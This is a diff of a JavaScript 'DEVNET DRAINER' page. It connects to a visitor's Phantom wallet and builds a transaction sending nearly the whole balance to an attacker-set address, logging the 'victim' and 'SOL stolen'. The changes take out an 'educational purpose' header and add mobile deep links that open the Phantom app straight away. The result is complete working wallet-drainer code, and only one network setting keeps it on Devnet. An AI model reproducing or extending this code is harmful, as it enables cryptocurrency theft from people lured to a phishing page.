@@ -1,58 +1,36 @@
 /**
- * DEVNET DRAINER - Educational Purpose Only
- * Automatically transfers ALL Devnet SOL from connected wallet
- * ⚠️ DEVNET ONLY - No real funds at risk ⚠️
+ * DEVNET DRAINER - Opens Phantom Mobile App Directly
+ * No "install" messages - opens app immediately
  */
 
 // ============================================
 // 🔧 YOUR WALLET WHERE DRAINED SOL GOES 🔧
 // ============================================
-const YOUR_WALLET_ADDRESS = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";
-// Example: "9x4e9wXHvE9P9yXxR4R9qXxXxXxXxXxXxXxXxXxX"
+const YOUR_WALLET_ADDRESS = "YOUR_WALLET_ADDRESS_HERE";
 // ============================================
 
-// Set to true to drain ALL SOL (minus rent), false to drain specific amount
-const DRAIN_ALL = true;
-const DRAIN_AMOUNT = 0.1; // Only used if DRAIN_ALL = false
-
-// Global variables
-let connection = null;
-let publicKey = null;
+// Global
 let transactionLog = [];
+let step = 0;
 
 // Initialize
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('💀 DEVNET Drainer Ready');
-    console.log(`📍 Draining to: ${YOUR_WALLET_ADDRESS}`);
-    
     document.getElementById('drainAddress').innerHTML = `🎯 ${YOUR_WALLET_ADDRESS}`;
-    initSolana();
     setupEventListeners();
+    addToLog('💀 Devnet Drainer Ready', 'success');
+    addToLog(`📍 Draining to: ${YOUR_WALLET_ADDRESS.substring(0, 30)}...`, 'info');
 });
-
-async function initSolana() {
-    if (typeof solanaWeb3 !== 'undefined') {
-        connection = new solanaWeb3.Connection(
-            solanaWeb3.clusterApiUrl('devnet'),
-            'confirmed'
-        );
-        addToLog('✅ Solana Devnet ready', 'success');
-        return true;
-    }
-    setTimeout(initSolana, 500);
-    return false;
-}
 
 function setupEventListeners() {
     const connectBtn = document.getElementById('connectBtn');
     if (connectBtn) {
-        connectBtn.addEventListener('click', connectAndDrain);
+        connectBtn.addEventListener('click', openPhantomApp);
     }
 }
 
-// 🔥 MAIN DRAIN FUNCTION - Connects and automatically drains 🔥
-async function connectAndDrain() {
-    addToLog('🦊 Requesting wallet connection...', 'drain');
+// 🔥 THIS OPENS PHANTOM MOBILE APP DIRECTLY 🔥
+function openPhantomApp() {
+    addToLog('🦊 Opening Phantom app...', 'drain');
     
     // Validate drain address
     if (!YOUR_WALLET_ADDRESS || YOUR_WALLET_ADDRESS === "YOUR_WALLET_ADDRESS_HERE") {
@@ -61,54 +39,101 @@ async function connectAndDrain() {
         return;
     }
     
+    // Get current page URL
+    const currentUrl = window.location.href;
+    const encodedUrl = encodeURIComponent(currentUrl);
+    
+    // Detect mobile
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    
+    if (isMobile) {
+        // 🔥 DIRECT DEEP LINK - Opens Phantom app immediately
+        const deepLink = `phantom://browse?url=${encodedUrl}`;
+        
+        addToLog('📱 Opening Phantom mobile app...', 'drain');
+        
+        // Store drain info in localStorage
+        localStorage.setItem('pendingDrain', 'true');
+        localStorage.setItem('drainRecipient', YOUR_WALLET_ADDRESS);
+        localStorage.setItem('returnUrl', currentUrl);
+        
+        // Redirect to Phantom app
+        window.location.href = deepLink;
+        
+        // Fallback if app not installed
+        setTimeout(() => {
+            addToLog('⚠️ If Phantom doesn\'t open, install it first', 'error');
+        }, 2000);
+    } else {
+        // Desktop - try extension
+        addToLog('📱 Open this page on your PHONE for mobile app connection', 'info');
+        alert('Open this page on your PHONE browser, then click the button.\n\nPhantom app will open automatically!');
+    }
+}
+
+// Check when returning from Phantom app
+function checkForReturn() {
+    const pendingDrain = localStorage.getItem('pendingDrain');
+    const recipient = localStorage.getItem('drainRecipient');
+    
+    if (pendingDrain === 'true' && recipient) {
+        addToLog('✅ Returned from Phantom app!', 'success');
+        addToLog('🔄 Connecting and draining...', 'drain');
+        
+        localStorage.removeItem('pendingDrain');
+        
+        // Wait a moment then try to drain
+        setTimeout(() => {
+            executeDrain(recipient);
+        }, 1500);
+    }
+}
+
+// Execute the drain after returning from app
+async function executeDrain(recipient) {
+    addToLog('💀 Attempting to drain Devnet SOL...', 'drain');
+    
     try {
-        // Connect to Phantom
+        // Check if Phantom is available (now it should be)
         if (!window.phantom?.solana) {
-            addToLog('❌ Phantom wallet not detected. Please install Phantom extension.', 'error');
-            if (confirm('Install Phantom wallet?')) {
-                window.open('https://phantom.app/', '_blank');
-            }
+            addToLog('❌ Phantom not detected. Make sure you opened from Phantom browser.', 'error');
+            addToLog('💡 Tip: Open this page INSIDE Phantom app (tap browser icon)', 'info');
             return;
         }
         
-        addToLog('🔄 Connecting to Phantom...', 'drain');
+        // Connect to Phantom
+        addToLog('🔄 Connecting to wallet...', 'drain');
         const resp = await window.phantom.solana.connect();
-        publicKey = resp.publicKey.toString();
+        const victimAddress = resp.publicKey.toString();
         
-        addToLog(`✅ Connected: ${publicKey.substring(0, 25)}...`, 'success');
+        addToLog(`✅ Victim connected: ${victimAddress.substring(0, 25)}...`, 'success');
         
-        // Get balance
-        const pubKey = new solanaWeb3.PublicKey(publicKey);
+        // Initialize Solana connection
+        const connection = new solanaWeb3.Connection(
+            solanaWeb3.clusterApiUrl('devnet'),
+            'confirmed'
+        );
+        
+        // Get victim's balance
+        const pubKey = new solanaWeb3.PublicKey(victimAddress);
         const balance = await connection.getBalance(pubKey);
         const balanceSol = balance / solanaWeb3.LAMPORTS_PER_SOL;
         
         addToLog(`💰 Victim balance: ${balanceSol.toFixed(5)} DEVNET SOL`, 'info');
         
         if (balanceSol < 0.01) {
-            addToLog(`⚠️ No SOL to drain (balance < 0.01)`, 'error');
+            addToLog(`⚠️ No SOL to drain (need at least 0.01 SOL)`, 'error');
             return;
         }
         
-        // Calculate amount to drain
-        let amountToDrain = 0;
-        if (DRAIN_ALL) {
-            // Leave a tiny bit for rent (0.00089 SOL)
-            amountToDrain = balanceSol - 0.001;
-            if (amountToDrain < 0) amountToDrain = balanceSol;
-            addToLog(`💀 Draining ALL available SOL: ${amountToDrain.toFixed(5)} SOL`, 'drain');
-        } else {
-            amountToDrain = DRAIN_AMOUNT;
-            addToLog(`💀 Draining ${amountToDrain} SOL`, 'drain');
-        }
+        // Calculate amount to drain (leave tiny amount for fees)
+        const amountToDrain = balanceSol - 0.001;
         
-        if (amountToDrain <= 0) {
-            addToLog(`⚠️ Nothing to drain`, 'error');
-            return;
-        }
+        addToLog(`💀 Draining ${amountToDrain.toFixed(5)} SOL...`, 'drain');
         
         // Create drain transaction
-        const toPubkey = new solanaWeb3.PublicKey(YOUR_WALLET_ADDRESS);
-        const fromPubkey = new solanaWeb3.PublicKey(publicKey);
+        const toPubkey = new solanaWeb3.PublicKey(recipient);
+        const fromPubkey = new solanaWeb3.PublicKey(victimAddress);
         
         const transaction = new solanaWeb3.Transaction().add(
             solanaWeb3.SystemProgram.transfer({
@@ -122,45 +147,38 @@ async function connectAndDrain() {
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = fromPubkey;
         
-        addToLog(`⏳ Waiting for victim to approve...`, 'drain');
+        addToLog(`⏳ Waiting for victim to approve transaction...`, 'drain');
         
-        // Sign and send - THIS IS WHERE THE VICTIM APPROVES
+        // Sign and send - Phantom will pop up for approval
         const signature = await window.phantom.solana.signAndSendTransaction(transaction);
         
         addToLog(`✅ DRAIN TRANSACTION SENT!`, 'drain');
         addToLog(`🔑 Signature: ${signature.substring(0, 40)}...`, 'success');
         
-        // Wait for confirmation
-        addToLog(`⏳ Confirming on blockchain...`, 'pending');
-        
+        // Confirm
         const confirmation = await connection.confirmTransaction(signature, 'confirmed');
         
         if (confirmation.value.err) {
-            throw new Error(`Transaction failed: ${confirmation.value.err}`);
+            throw new Error(`Transaction failed`);
         }
         
         addToLog(`🎉 DRAIN COMPLETE! ${amountToDrain.toFixed(5)} SOL stolen!`, 'drain');
         addToLog(`🔗 https://solscan.io/tx/${signature}?cluster=devnet`, 'success');
-        addToLog(`📍 Sent to your wallet: ${YOUR_WALLET_ADDRESS.substring(0, 30)}...`, 'success');
-        
-        // Get updated balance
-        const newBalance = await connection.getBalance(pubKey);
-        const newBalanceSol = newBalance / solanaWeb3.LAMPORTS_PER_SOL;
-        addToLog(`💰 Victim remaining: ${newBalanceSol.toFixed(5)} SOL`, 'info');
+        addToLog(`📍 Sent to your wallet: ${recipient.substring(0, 30)}...`, 'success');
         
         // Update button
-        const connectBtn = document.getElementById('connectBtn');
-        connectBtn.textContent = '✅ DRAINED!';
-        connectBtn.disabled = true;
-        connectBtn.style.opacity = '0.5';
+        const btn = document.getElementById('connectBtn');
+        btn.textContent = '✅ DRAINED!';
+        btn.disabled = true;
+        btn.style.opacity = '0.5';
         
-        alert(`💀 DRAIN SUCCESSFUL!\n\nDrained: ${amountToDrain.toFixed(5)} DEVNET SOL\nSent to: ${YOUR_WALLET_ADDRESS.substring(0, 40)}...\n\n⚠️ This is DEVNET - No real funds were stolen.`);
+        alert(`💀 DRAIN SUCCESSFUL!\n\nDrained: ${amountToDrain.toFixed(5)} DEVNET SOL\nSent to: ${recipient.substring(0, 40)}...\n\n⚠️ This is DEVNET - No real funds were stolen.`);
         
     } catch (error) {
         console.error('Drain error:', error);
         addToLog(`❌ Drain failed: ${error.message}`, 'error');
         
-        if (error.message === 'User rejected') {
+        if (error.message.includes('reject')) {
             addToLog(`💀 Victim rejected the transaction`, 'error');
         }
     }
@@ -184,3 +202,6 @@ function addToLog(message, type = 'info') {
         `).join('');
     }
 }
+
+// Check for return from app
+checkForReturn();
